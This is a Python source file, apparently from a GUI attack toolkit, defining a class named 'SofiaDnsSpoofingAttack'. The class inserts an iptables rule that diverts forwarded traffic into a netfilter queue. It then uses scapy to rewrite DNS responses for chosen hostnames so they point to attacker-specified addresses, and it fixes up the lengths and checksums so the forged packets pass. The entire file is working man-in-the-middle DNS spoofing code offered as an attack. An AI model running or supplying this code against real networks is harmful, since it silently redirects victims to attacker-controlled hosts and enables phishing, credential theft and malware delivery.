import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue
from PyQt5.QtCore import QObject, QThread, pyqtSignal, QWaitCondition, QMutex

class SofiaDnsSpoofingAttack(QObject):
	finished = pyqtSignal()

	def __init__(self, hostDict, queueNum, append_log, loop):
		super().__init__()

		self.hostDict = hostDict
		self.queueNum = queueNum
		self.append_log = append_log
		self.queue = NetfilterQueue()
		self.loop = loop
		self.done = False

	def __call__(self):
		self.append_log("[DNS] Starting DNS Spoofing ...")
		os.system(
			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
		self.queue.bind(self.queueNum, self.callBack)
		
		while self.loop:
			self.queue.run(block=False)

		self.finished.emit()
		self.done = True
		os.system(
			f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
		self.append_log("[!] iptable rule flushed")

	def callBack(self, packet):
		scapyPacket = IP(packet.get_payload())
		if scapyPacket.haslayer(DNSRR):
			try:
				self.append_log(f'[original] { scapyPacket[DNSRR].summary()}')
				queryName = scapyPacket[DNSQR].qname
				if queryName in self.hostDict:
					scapyPacket[DNS].an = DNSRR(
						rrname=queryName, rdata=self.hostDict[queryName])
					scapyPacket[DNS].ancount = 1
					del scapyPacket[IP].len
					del scapyPacket[IP].chksum
					del scapyPacket[UDP].len
					del scapyPacket[UDP].chksum
					self.append_log(f'[modified] {scapyPacket[DNSRR].summary()}')
				else:
					self.append_log(f'[not modified] { scapyPacket[DNSRR].rdata }')
			except IndexError as error:
				self.append_log(f"Error: {error}")

			packet.set_payload(bytes(scapyPacket))
		return packet.accept()

	def run(self):
		self.__call__()
